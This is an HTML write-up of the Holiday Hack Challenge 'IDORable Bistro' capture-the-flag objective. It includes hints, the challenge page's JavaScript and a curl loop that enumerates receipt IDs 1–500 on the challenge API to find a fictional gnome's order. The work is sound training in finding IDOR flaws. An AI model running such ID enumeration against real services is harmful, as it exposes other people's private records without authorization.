@@ -1,0 +1,420 @@
+<div class="kc-section kc-section--idorable-bistro" style="margin-bottom: 0;">
+  <h1 class="kc-section-title">IDORable Bistro</h1>
+  
+  <!-- Difficulty + Location -->
+  <div class="kc-objective-meta kc-objective-meta--stacked">
+    <div class="kc-meta-line kc-difficulty">
+      <span class="kc-meta-label">Difficulty:</span>
+      <span class="kc-difficulty-scale"
+            aria-label="Difficulty 1 out of 5 snowflakes">
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake kc-snowflake-active"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+        <i class="fas fa-snowflake kc-snowflake"></i>
+      </span>
+    </div>
+
+    <div class="kc-meta-line kc-location">
+      <span class="kc-meta-label">Location:</span>
+      <span class="kc-meta-value">Sasabune</span>
+    </div>
+  </div>
+
+  <!-- Objective line -->
+  <p class="kc-objective-summary kc-meta-line">
+    <span class="kc-meta-label">Objective:</span>
+    <span class="kc-meta-value">
+      Josh has a tasty IDOR treat for you—stop by Sasabune for a bite of vulnerability. What is the name of the gnome?
+    </span>
+  </p>
+
+  <!-- Conversation banner -->
+  <div class="kc-convo-header">
+    <span class="kc-convo-icon">
+      <i class="fas fa-comment-dots" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Josh Wright Conversation:</span>
+  </div>
+
+  <div class="kc-objective-detail kc-objective-detail--no-panel">
+    <div class="kc-convo-bubble">
+      <div class="kc-convo-avatar">
+        <img src="joshwright-avatar.gif"
+             alt="Josh Wright avatar">
+        <div class="kc-convo-name">Josh Wright</div>
+      </div>
+
+      <div class="kc-convo-text">
+        <p>
+          I'm a teetotling hacker.
+        </p>
+        <p>
+          I sleep about 4 hours a night.
+        </p>
+        <p>
+          Photography is my hobby, but the anachronistic sort: before 1900.
+        </p>
+        <p>
+          Teaching people how to hack and protect systems is my passion.
+        </p>
+        <p>
+          I need your help with something urgent.
+        </p>
+        <p>
+          A gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.
+        </p>
+        <p>
+          Based on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.
+        </p>
+        <p>
+          I was...<a href="https://www.youtube.com/watch?v=hzrhtHrhwno" target="_blank" rel="noopener noreferrer">at a talk recently</a>...and learned some interesting things about some of these payment systems. Let's use that receipt to dig deeper and unmask this gnome's true identity.
+        </p>
+        <p>
+          Did you see that receipt outside the door?
+        </p>
+
+        <div class="kc-convo-actions">
+          <button class="kc-convo-play-btn" type="button"
+                  data-npc-audio="idorable-bistro">
+            <i class="fas fa-play" aria-hidden="true"></i>
+            <span>Play Audio</span>
+          </button>
+        </div>
+      </div> <!-- /.kc-convo-text -->
+    </div>   <!-- /.kc-convo-bubble -->
+  </div>     <!-- /.kc-objective-detail -->
+
+  <!-- Hints header -->
+  <div class="kc-convo-header kc-hints-header">
+    <span class="kc-convo-icon kc-hints-icon">
+      <i class="fas fa-lightbulb" aria-hidden="true"></i>
+    </span>
+    <span class="kc-convo-title">Hints:</span>
+  </div>
+
+<!-- Hint 1 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">What's For Lunch?</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: IDORable Bistro</div>
+  <p>
+    I had tried to scan one of the QR codes and it took me to somebody's meal receipt! I am afraid somebody could look up anyone's meal if they have the correct ID...in the correct place.
+  </p>
+</div>
+
+<!-- Hint 2 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">QR Codes</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: IDORable Bistro</div>
+  <p>
+    I have been seeing a lot of receipts lying around with some kind of QR code on them. I am pretty sure they are for Duke Dosis's Holiday Bistro. Interesting...see you if you can find one and see what they are all about...
+  </p>
+</div>
+
+<!-- Hint 3 -->
+<div class="kc-hint-card">
+  <div class="kc-hint-title">Will the Real ID Please...</div>
+  <div class="kc-hint-meta">From: Santa</div>
+  <div class="kc-hint-meta">Objective: IDORable Bistro</div>
+  <p>
+    Sometimes...developers put in a lot of effort to anonymyze information by using randomly generated identifiers...but...there are also times where the "real" ID is used in a separate Network request...
+  </p>
+</div>
+
+<!-- NEW purple banner goes *after* the bubble -->
+<div class="kc-workflow-header">
+<span class="kc-workflow-icon">
+    <i class="fas fa-tasks" aria-hidden="true"></i>
+</span>
+<span class="kc-workflow-title">Working through the Challenge:</span>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <div class="kc-workflow-row">
+    <div class="kc-workflow-text">
+      <p class="kc-workflow-intro">
+        We need to aquire that receipt take a lap around the Sasabune bistro, using
+        the Q and E keys to rotate the map might be helpful. 
+      </p>
+      <p class="kc-workflow-intro">
+        When you find the receipt simply click on it to aquire it.
+      </p>
+    </div>
+
+    <div class="kc-workflow-illustration">
+      <img src="sasabune_front.png"
+          alt="Sasabune Bistro front"
+          class="kc-workflow-image">
+    </div>
+  </div>
+</div>
+
+<!-- Item header -->
+<div class="kc-convo-header kc-item-header">
+  <span class="kc-convo-icon kc-item-icon">
+    <i class="fas fa-box-open" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Item</span>
+</div>
+
+<div class="kc-item-bubble">
+  <!-- Clickable floppy icon -->
+  <a href="receipt.png" download class="kc-item-thumb-link">
+    <img src="receipt.png" alt="Receipt icon" class="kc-item-thumb">
+  </a>
+
+  <div class="kc-item-body">
+    <!-- Clickable filename -->
+    <a href="receipt.png" download class="kc-item-title-link">
+      <span class="kc-item-title">receipt.png</span>
+    </a>
+    <p class="kc-item-desc">
+      A
+      <!-- Clickable “floppy disk image” text -->
+      <a href="receipt.png" download class="kc-item-inline-link">
+        crumbled piece of paper
+      </a>
+      that appears to be a receipt for Sasabune. Interesting...this receipt has one of those QR code thingies on it. I wonder...
+    </p>
+  </div>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Now that we have the receipt, scanning the QR code (or using an online QR
+    code reader such as
+    <a href="https://scanqr.org/" class="kc-link-note" target="_blank" rel="noopener noreferrer">scanqr.org</a>
+    takes us to the following URL:
+    <a href="https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2"
+    class="kc-link-note" target="_blank" rel="noopener noreferrer">
+    https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2
+    </a>.
+  </p>
+</div>
+
+  <div class="kc-ptas-screenshot">
+    <div class="kc-ptas-image-wrapper">
+      <img
+        src="sasabune_receipt.png"
+        alt="Sasabune receipt (QR code)"
+        class="kc-ptas-thumb"
+        data-full-src="sasabune_receipt.png"
+      >
+
+      <button
+        class="kc-ptas-enlarge-btn"
+        type="button"
+        data-enlarge-target="sasabune_receipt.png"
+      >
+        <i class="fas fa-search-plus" aria-hidden="true"></i>
+        Enlarge
+      </button>
+    </div>
+
+    <div class="kc-ptas-caption">Receipt details - Link from QR code</div>
+  </div>
+
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Per the hint, we’re looking for a way to send an alternate web request (likely with a real receipt ID).
+    Reviewing the page source from the QR code link reveals a very interesting API endpoint:
+    <code>/api/receipt?id=${id}</code>
+  </p>
+</div>
+
+<div class="kc-code-window kc-code-window--autoheight">
+
+  <div class="kc-code-header">
+    <i class="fas fa-code" aria-hidden="true"></i>
+    <span>Source snippet (client-side JavaScript)</span>
+  </div>
+
+  <pre class="kc-code-block" data-line="9"><code class="language-javascript">&lt;script&gt;
+    // Initial receipt ID
+    let receiptId = '103';
+    
+    // Function to fetch and display receipt details
+    function fetchReceiptDetails(id) {
+        // Add a small delay for dramatic effect
+        setTimeout(function() {
+            fetch(`/api/receipt?id=${id}`)
+                .then(response =&gt; {
+                    if (!response.ok) {
+                        throw new Error('Receipt not found');
+                    }
+                    return response.json();
+                })
+ 
+---- Trimend output ----
+                    
+                    // If we found the flag, celebrate!
+                    if (data.secret_note && data.secret_note.includes("FLAG:")) {
+                        celebrateFlag();
+                    }
+                })
+                .catch(error =&gt; {
+                    document.getElementById('check-details').innerHTML = `
+                        &lt;div class="error"&gt;
+                            &lt;div class="error-icon"&gt;❌&lt;/div&gt;
+                            Error: ${error.message}
+                        &lt;/div&gt;
+                    `;
+                });
+        }, 800); // Delay for dramatic effect
+    }
+&lt;/script&gt;</code></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Next, let’s query the receipt API directly with <code>curl</code>. I set a base URL variable,
+    then pulled receipt <code>id=103</code> and piped it into <code>jq</code> for readability.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+  <pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/idorable]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">BASE="https://its-idorable.holidayhackchallenge.com"</span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/idorable]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-command">curl -s "$BASE/api/receipt?id=103" | jq .</span>
+<span class="term-kali-output term-kali-jq"><span class="term-jq-brace">{</span>
+  <span class="term-jq-key">"customer"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Bobby Mitchell"</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"date"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"2025-12-19"</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"id"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">103</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"items"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">[</span>
+    <span class="term-jq-brace">{</span>
+      <span class="term-jq-key">"name"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"California Roll"</span><span class="term-jq-punct">,</span>
+      <span class="term-jq-key">"price"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">12</span>
+    <span class="term-jq-brace">}</span><span class="term-jq-punct">,</span>
+    <span class="term-jq-brace">{</span>
+      <span class="term-jq-key">"name"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Ramune Soda"</span><span class="term-jq-punct">,</span>
+      <span class="term-jq-key">"price"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">4.5</span>
+    <span class="term-jq-brace">}</span><span class="term-jq-punct">,</span>
+    <span class="term-jq-brace">{</span>
+      <span class="term-jq-key">"name"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Pocky Sticks"</span><span class="term-jq-punct">,</span>
+      <span class="term-jq-key">"price"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">3</span>
+    <span class="term-jq-brace">}</span>
+  <span class="term-jq-brace">]</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"note"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Tried to pay for his meal with a rare trading card featuring an original creature called 'Glimmerfin'. He was very insistent it would be valuable someday."</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"paid"</span><span class="term-jq-punct">:</span> <span class="term-jq-bool">true</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"table"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">3</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"total"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">19.5</span>
+<span class="term-jq-brace">}</span></span>
+
+<span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/idorable]</span>
+<span class="term-kali-prompt">└─$</span></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+  <p>
+    Next, I searched the receipt API responses for any mention of the word
+    <code>frozen</code>. The goal here is to locate the “frozen sushi” order
+    mentioned in the hint and use that receipt’s <code>customer</code> field to
+    identify the gnome.
+  </p>
+  <p>
+    That search surfaced a single matching receipt, where the customer insisted
+    on a “Frozen Roll.” The customer name on that receipt reveals the gnome:
+    <strong>Bartholomew Quibblefrost</strong>.
+  </p>
+</div>
+
+<div class="kc-terminal-window kc-terminal-window--wrap kc-terminal-window--kali">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">🖥️</span>
+    <span class="kali-title">Kali Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+<pre class="kc-terminal-text"><span class="term-kali-prompt">┌──(<span class="term-kali-user">postshell</span><span class="term-kali-symbol">㉿</span><span class="term-kali-host">postshell</span>)</span><span class="term-kali-path">-[~/HHC2025/idorable]</span>
+<span class="term-kali-prompt">└─$</span> <span class="term-kali-kw">for</span> <span class="term-kali-var">i</span> <span class="term-kali-kw">in</span> <span class="term-kali-op">$(</span><span class="term-kali-fn">seq</span> <span class="term-kali-num">1</span> <span class="term-kali-num">500</span><span class="term-kali-op">)</span><span class="term-kali-op">;</span> <span class="term-kali-kw">do</span>
+<span class="term-kali-var">  json</span><span class="term-kali-op">=$(</span><span class="term-kali-fn">curl</span> <span class="term-kali-op">-s</span> <span class="term-kali-op">--fail</span> <span class="term-kali-str">"$BASE/api/receipt?id=$i"</span> <span class="term-kali-num">2</span><span class="term-kali-op">&gt;</span><span class="term-kali-pathlit">/dev/null</span><span class="term-kali-op">)</span> <span class="term-kali-op">||</span> <span class="term-kali-kw">continue</span>
+<span class="term-kali-op">  [</span> <span class="term-kali-op">-z</span> <span class="term-kali-str">"$json"</span> <span class="term-kali-op">]</span> <span class="term-kali-op">&amp;&amp;</span> <span class="term-kali-kw">continue</span>
+
+<span class="term-kali-kw">  if</span> <span class="term-kali-fn">echo</span> <span class="term-kali-str">"$json"</span> <span class="term-kali-op">|</span> <span class="term-kali-fn">jq</span> <span class="term-kali-op">-e</span> <span class="term-kali-str">'([.. | strings] | join(" ") | test("frozen"; "i"))'</span> <span class="term-kali-op">&gt;</span><span class="term-kali-pathlit">/dev/null</span><span class="term-kali-op">;</span> <span class="term-kali-kw">then</span>
+<span class="term-kali-op">    </span><span class="term-kali-fn">echo</span> <span class="term-kali-str">"$json"</span> <span class="term-kali-op">|</span> <span class="term-kali-fn">jq</span> <span class="term-kali-op">-r</span>
+<span class="term-kali-kw">  fi</span>
+
+<span class="term-kali-op">  </span><span class="term-kali-fn">sleep</span> <span class="term-kali-num">0.05</span>
+<span class="term-kali-kw">done</span>
+
+</pre>
+  <pre class="kc-terminal-text"><span class="term-kali-output term-kali-jq"><span class="term-jq-brace">{</span>
+  <span class="term-jq-key">"customer"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Bartholomew Quibblefrost"</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"date"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"2025-12-20"</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"id"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">139</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"items"</span><span class="term-jq-punct">:</span> <span class="term-jq-brace">[</span>
+    <span class="term-jq-brace">{</span>
+      <span class="term-jq-key">"name"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)"</span><span class="term-jq-punct">,</span>
+      <span class="term-jq-key">"price"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">19</span>
+    <span class="term-jq-brace">}</span>
+  <span class="term-jq-brace">]</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"note"</span><span class="term-jq-punct">:</span> <span class="term-jq-string">"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk."</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"paid"</span><span class="term-jq-punct">:</span> <span class="term-jq-bool">true</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"table"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">14</span><span class="term-jq-punct">,</span>
+  <span class="term-jq-key">"total"</span><span class="term-jq-punct">:</span> <span class="term-jq-number">19</span>
+<span class="term-jq-brace">}</span></span></pre>
+</div>
+
+<div class="kc-solution-header">
+  <span class="kc-solution-icon">
+    <i class="fas fa-check-circle" aria-hidden="true"></i>
+  </span>
+  <span class="kc-solution-title"><strong>SOLUTION: Bartholomew Quibblefrost</strong></span>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="joshwright-portrait.png"
+           alt="Josh Wright avatar">
+      <div class="kc-convo-name">Josh Wright</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Excellent work exploiting that IDOR vulnerability - textbook execution.
+      </p>
+      <p>
+        Now we know exactly which gnome tried to pass itself off as a sushi connoisseur. Frozen rolls... honestly, what's next?
+      </p>
+
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
